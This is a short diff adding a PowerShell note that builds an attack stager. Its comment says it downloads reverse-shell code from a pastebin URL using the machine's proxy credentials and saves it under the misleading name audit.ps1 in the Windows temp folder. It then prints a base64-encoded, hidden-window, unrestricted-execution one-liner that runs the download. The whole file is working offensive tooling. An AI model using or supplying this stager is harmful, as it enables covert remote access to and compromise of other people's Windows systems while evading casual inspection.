@@ -1,0 +1,10 @@
+#command to download (using proxy credentials) standard powershell reverse shell code and save to win\temp\audit.ps1
+
+$command = '$wc = New-Object Net.WebClient;$wc.UseDefaultCredentials = $true;$wc.Proxy.Credentials = $wc.Credentials;$client = new-object System.Net.WebClient;$client.DownloadFile("http://pastebin.com/raw.php?i=A32ev8bC", "C:\Windows\Temp\audit.ps1"  )'
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+write-host $encodedCommand
+
+End command is...
+powershell.exe -windowstyle hidden -executionpolicy unrestricted -encodedcommand JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHcAYwAuAFUAcwBlAEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdAByAHUAZQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgACQAdwBjAC4AQwByAGUAZABlAG4AdABpAGEAbABzADsAJABjAGwAaQBlAG4AdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALgBwAGgAcAA/AGkAPQBBADMAMgBlAHYAOABiAEMAIgAsACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGEAdQBkAGkAdAAuAHAAcwAxACIAIAAgACkA
